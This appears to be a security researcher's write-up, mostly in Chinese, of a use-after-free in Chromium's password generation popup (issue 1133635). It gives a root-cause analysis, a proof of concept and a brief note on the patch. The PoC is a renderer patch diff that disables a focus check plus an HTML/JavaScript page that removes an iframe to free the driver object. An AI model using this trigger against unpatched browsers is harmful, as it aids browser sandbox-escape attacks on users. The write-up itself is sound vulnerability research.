https://bugs.chromium.org/p/chromium/issues/detail?id=1133635

### Root case

```c++
void PasswordGenerationPopupControllerImpl::PasswordAccepted() {
  if (state_ != kOfferGeneration)
    return;

  base::WeakPtr<PasswordGenerationPopupControllerImpl> weak_this = GetWeakPtr();
  driver_->GeneratedPasswordAccepted(form_data_, generation_element_id_,
                                     current_password_);        // =====> [1]
  // |this| can be destroyed here because GeneratedPasswordAccepted pops up
  // another UI and generates some event to close the dropdown.
  if (weak_this)
    weak_this->HideImpl();
}
```

首先在[1]处调用driver_的虚函数时，没有空指针的check。
我们接着来看看这个driver_：

```
base::WeakPtr<password_manager::PasswordManagerDriver> const driver_;


class ContentPasswordManagerDriver
    : public PasswordManagerDriver,
      public autofill::mojom::PasswordManagerDriver {


ContentPasswordManagerDriver*
ContentPasswordManagerDriverFactory::GetDriverForFrame(
    content::RenderFrameHost* render_frame_host) {
  DCHECK_EQ(web_contents(),
            content::WebContents::FromRenderFrameHost(render_frame_host));
  DCHECK(render_frame_host->IsRenderFrameCreated());

  // TryEmplace() will return an iterator to the driver corresponding to
  // `render_frame_host`. It creates a new one if required.
  return &base::TryEmplace(frame_driver_map_, render_frame_host,
                           // Args passed to the ContentPasswordManagerDriver
                           // constructor if none exists for `render_frame_host`
                           // yet.
                           render_frame_host, password_client_,
                           autofill_client_)
              .first->second;
}
```

ContentPasswordManagerDriver的生命周期被绑定到了RenderFrameHost，当RenderFrameHost被delete时，将会调用ContentPasswordManagerDriverFactory::RenderFrameDeleted函数
```
void ContentPasswordManagerDriverFactory::RenderFrameDeleted(
    content::RenderFrameHost* render_frame_host) {
  frame_driver_map_.erase(render_frame_host);   // =====> [2]
}
```
在函数中将通过erase的方式来析构掉ContentPasswordManagerDriver，这样的话再去调用driver_->GeneratedPasswordAccepted的话就会触发uaf。


这里要注意的是：正常的执行流程下将会调用下面的函数,该函数将通知bowser the generation element lost focus也就是[3],这会导致浏览器隐藏生成弹出视图，之后将没有机会调用GeneratedPasswordAccepted，但是如果我们有一个rce漏洞，就可以patch掉这个检测，达到uaf。

```
void PasswordGenerationAgent::DidEndTextFieldEditing(
    const blink::WebInputElement& element) {
  if (!element.IsNull() && current_generation_item_ &&
      element == current_generation_item_->generation_element_) {
    GetPasswordGenerationDriver()->GenerationElementLostFocus();   // =====> [3]
    current_generation_item_->generation_element_.SetShouldRevealPassword(
        false);
  }
}
```


### poc

patch
```

diff --git a/components/autofill/content/renderer/password_generation_agent.cc b/components/autofill/content/renderer/password_generation_agent.cc
index a87d298ca38f..bb0d815f264e 100644
--- a/components/autofill/content/renderer/password_generation_agent.cc
+++ b/components/autofill/content/renderer/password_generation_agent.cc
@@ -429,7 +429,7 @@ void PasswordGenerationAgent::DidEndTextFieldEditing(
     const blink::WebInputElement& element) {
   if (!element.IsNull() && current_generation_item_ &&
       element == current_generation_item_->generation_element_) {
-    GetPasswordGenerationDriver()->GenerationElementLostFocus();
+    // GetPasswordGenerationDriver()->GenerationElementLostFocus();
     current_generation_item_->generation_element_.SetShouldRevealPassword(
         false);
   }
diff --git a/components/password_manager/core/browser/password_generation_frame_helper.cc b/components/password_manager/core/browser/password_generation_frame_helper.cc
index 057922d87452..5f1847beeadf 100644
--- a/components/password_manager/core/browser/password_generation_frame_helper.cc
+++ b/components/password_manager/core/browser/password_generation_frame_helper.cc
@@ -87,28 +87,29 @@ void PasswordGenerationFrameHelper::ProcessPasswordRequirements(
 // (3) The current page is not *.google.com.
 bool PasswordGenerationFrameHelper::IsGenerationEnabled(
     bool log_debug_data) const {
-  std::unique_ptr<Logger> logger;
-  if (log_debug_data && password_manager_util::IsLoggingActive(client_)) {
-    logger = std::make_unique<BrowserSavePasswordProgressLogger>(
-        client_->GetLogManager());
-  }
-
-  GURL url = driver_->GetLastCommittedURL();
-  if (url.DomainIs("google.com"))
-    return false;
-
-  if (!client_->IsSavingAndFillingEnabled(url)) {
-    if (logger)
-      logger->LogMessage(Logger::STRING_GENERATION_DISABLED_SAVING_DISABLED);
-    return false;
-  }
-
-  if (client_->GetPasswordFeatureManager()->IsGenerationEnabled())
-    return true;
-  if (logger)
-    logger->LogMessage(Logger::STRING_GENERATION_DISABLED_NO_SYNC);
-
-  return false;
+  // std::unique_ptr<Logger> logger;
+  // if (log_debug_data && password_manager_util::IsLoggingActive(client_)) {
+  //   logger = std::make_unique<BrowserSavePasswordProgressLogger>(
+  //       client_->GetLogManager());
+  // }
+
+  // GURL url = driver_->GetLastCommittedURL();
+  // if (url.DomainIs("google.com"))
+  //   return false;
+
+  // if (!client_->IsSavingAndFillingEnabled(url)) {
+  //   if (logger)
+  //     logger->LogMessage(Logger::STRING_GENERATION_DISABLED_SAVING_DISABLED);
+  //   return false;
+  // }
+
+  // if (client_->GetPasswordFeatureManager()->IsGenerationEnabled())
+  //   return true;
+  // if (logger)
+  //   logger->LogMessage(Logger::STRING_GENERATION_DISABLED_NO_SYNC);
+
+  // return false;
+  return true;
 }
 
 base::string16 PasswordGenerationFrameHelper::GeneratePassword(
```

poc

```
<h2 id="h2_id">
1. Click the password input field in the iframe.<br><br>
2. Click to accept the suggestion **after iframe is deleted**.
</h2>


<form id="form">
    <label class="input-placeholder"></label>
    <input id="passwdfield" type="password" name="pwd" autocomplete="new-password" aria-autocomplete="list"/>
</form>

<script>
function deallocate_rfh() {
    document.body.removeChild(iframe);
}

function allocate_rfh() {
  iframe = document.createElement("iframe");
  iframe.src = window.location + "#child";
  document.body.appendChild(iframe);
}

if (window.location.hash == "#child") {
    window.onload = () => {
        document.getElementById("h2_id").innerHTML = "";

        var input = document.getElementById("passwdfield");
        input.onclick = () => {
            setTimeout(() => {parent.deallocate_rfh();}, 2000);
        }
    
    }
} else {
    window.onload = allocate_rfh;
    document.getElementById("form").innerHTML = "";
}

</script>
```


### patch

![](./img/1.png)
朴实无华的一个check

